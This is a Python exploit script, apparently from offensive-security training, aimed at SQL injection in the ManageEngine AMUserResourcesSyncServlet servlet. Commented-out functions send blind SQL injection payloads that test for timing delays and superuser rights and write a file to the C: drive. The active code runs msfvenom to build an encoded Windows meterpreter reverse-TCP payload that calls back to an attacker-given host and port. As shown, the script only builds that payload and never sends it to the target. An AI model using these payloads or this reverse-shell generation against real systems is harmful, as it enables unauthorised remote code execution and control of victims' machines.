#!/usr/bin/env python3

"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: RCE exploit for an SQL Injection identified in the ManageEngine AMUserResourceSyncServlet servlet.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import subprocess

# def blindSQLi(url):
# 	sqli = ";select+pg_sleep(10);"
# 	sqli_pg_user = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
# 	sqli_file_make=";COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+"
# 	print("\nRequest will return in 10 seconds if we have SQLi")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
# 	print(r.text)
# 	print(r.headers)
	
# 	print("\nRequest will return in 10 seconds if we are a superuser\n")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli_pg_user, verify=False)
# 	print(r.text)
# 	print(r.headers)

# 	print("\nCreating file in C:\\")
# 	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
# 					  params='ForMasRange=1&userId=1%s' % sqli_file_make, verify=False)
# 	print(r.text)
# 	print(r.headers)

def remove_tabs(input_string):
    # Replace all tabs with an empty string
    return input_string.replace("\t", "")

def replace_carriage_returns(input_string):
    # Replace all carriage returns with a colon
    return input_string.replace("\n", ":")

def replace_double_colons(input_string):
    # Replace all occurrences of "::" with ":"
    return input_string.replace("::", ":")

def gen_rev_shell(host, port):
	print("Generating Exploit With MSF Venom. Please Wait...")
	msf_output = 'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -f vbs'.format(lhost = host, lport = port)
	rev_shell = subprocess.run(msf_output,  shell=True, text=True, capture_output=True).stdout
	
	print("Making the reverse shell a one-liner...")
	rev_shell = remove_tabs(rev_shell)
	rev_shell = replace_carriage_returns(rev_shell)
	rev_shell = replace_double_colons(rev_shell)
	print(rev_shell)
	return rev_shell

def main():
	if len(sys.argv) != 4:
		print(f"(+) usage %s <target> <lhost> <lport>" % sys.argv[0])
		print(f"(+) eg: %s target lhost lport" % sys.argv[0])
		sys.exit(1)
	
	target = sys.argv[1]
	host = sys.argv[2]
	port = sys.argv[3]
	# blindSQLi(t)
	gen_rev_shell(host, port)

if __name__ == '__main__':
	main()